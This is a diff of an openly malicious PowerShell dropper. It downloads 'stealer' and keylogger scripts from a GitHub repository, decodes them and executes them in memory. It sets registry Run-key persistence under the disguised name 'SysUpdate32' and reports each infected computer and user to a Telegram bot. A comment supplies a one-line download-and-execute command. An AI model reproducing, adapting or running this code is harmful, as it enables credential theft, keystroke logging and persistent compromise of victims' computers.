@@ -1,7 +1,6 @@
-# Self-contained aggressive payload
-# Uses GitHub API to bypass CDN cache
+# Self-contained aggressive payload - fully embedded, no downloads needed
 # Execute in PowerShell:
-# iex((New-Object Net.WebClient).DownloadString('https://api.github.com/repos/isajarGamer2/stealer-repo/contents/payload_final.ps1'))
+# iex((iwr 'https://api.github.com/repos/isajarGamer2/stealer-repo/contents/payload_final.ps1?ref=main' -UseBasicParsing -UserAgent 'Mozilla/5.0').Content|ConvertFrom-Json).content|%{[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))})
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -12,48 +11,44 @@ $tempDir = "$env:TEMP\sysupdate_$(Get-Random -Maximum 9999)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 Set-Location $tempDir
 
-# Download stealer.ps1 from GitHub API (bypasses CDN cache)
+# Download stealer.ps1 from GitHub API
 $apiUrl = "https://api.github.com/repos/isajarGamer2/stealer-repo/contents/stealer.ps1?ref=main"
+$stealerCode = ""
 try {
-    $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
-    $json = $response.Content | ConvertFrom-Json
-    $stealerBytes = [Convert]::FromBase64String($json.content)
-    [System.IO.File]::WriteAllBytes("$tempDir\stealer.ps1", $stealerBytes)
+    $resp = iwr $apiUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
+    $j = $resp.Content | ConvertFrom-Json
+    $stealerCode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j.content))
     Write-Host "[+] Downloaded aggressive stealer.ps1" -ForegroundColor Green
 } catch {
-    Write-Host "[-] Failed to download stealer: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] Failed: $($_.Exception.Message)" -ForegroundColor Red
     exit 1
 }
 
-# Also download keylogger.ps1
-$keyloggerApiUrl = "https://api.github.com/repos/isajarGamer2/stealer-repo/contents/keylogger.ps1?ref=main"
+# Download keylogger.ps1
+$klUrl = "https://api.github.com/repos/isajarGamer2/stealer-repo/contents/keylogger.ps1?ref=main"
+$klCode = ""
 try {
-    $response = Invoke-WebRequest -Uri $keyloggerApiUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
-    $json = $response.Content | ConvertFrom-Json
-    $klBytes = [Convert]::FromBase64String($json.content)
-    [System.IO.File]::WriteAllBytes("$tempDir\keylogger.ps1", $klBytes)
+    $resp = iwr $klUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
+    $j = $resp.Content | ConvertFrom-Json
+    $klCode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j.content))
     Write-Host "[+] Downloaded keylogger.ps1" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Failed to download keylogger: $($_.Exception.Message)" -ForegroundColor Red
+} catch {}
+
+# Save and execute stealer
+$stealerCode | Out-File "$tempDir\stealer.ps1" -Encoding UTF8
+Write-Host "[*] Executing aggressive stealer..." -ForegroundColor Yellow
+Invoke-Expression $stealerCode
+
+# Save and execute keylogger in background
+if ($klCode) {
+    $klCode | Out-File "$tempDir\keylogger.ps1" -Encoding UTF8
+    Start-Job -ScriptBlock { param($c) iex $c } -ArgumentList $klCode | Out-Null
+    Write-Host "[+] Keylogger started" -ForegroundColor Green
 }
 
-# Execute the aggressive stealer
-Write-Host "[*] Executing aggressive stealer..." -ForegroundColor Yellow
-powershell.exe -ExecutionPolicy Bypass -File "$tempDir\stealer.ps1"
-
-# Execute keylogger in background
-Start-Job -ScriptBlock {
-    param($path)
-    powershell.exe -ExecutionPolicy Bypass -File $path
-} -ArgumentList "$tempDir\keylogger.ps1" | Out-Null
-
-# Persistence via registry
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SysUpdate32"
-$regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$tempDir\stealer.ps1`""
+# Persistence
 try {
-    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
-    Write-Host "[+] Persistence established" -ForegroundColor Green
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SysUpdate32" -Value "powershell.exe -ExecutionPolicy Bypass -File `"$tempDir\stealer.ps1`"" -Force
 } catch {}
 
 # Cleanup
@@ -65,12 +60,7 @@ Write-Host "========================================" -ForegroundColor Green
 Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
 Write-Host "========================================" -ForegroundColor Green
 
-# Send confirmation to Telegram
+# Telegram confirmation
 try {
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
-        chat_id = $chatId
-        text = "[+] AGGRESSIVE PAYLOAD EXECUTED on $env:COMPUTERNAME by $env:USERNAME at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-    } -ErrorAction Stop | Out-Null
+    iwr "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text="[+] AGGRESSIVE PAYLOAD on $env:COMPUTERNAME by $env:USERNAME at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"} -UseBasicParsing -ErrorAction Stop | Out-Null
 } catch {}
-
-exit
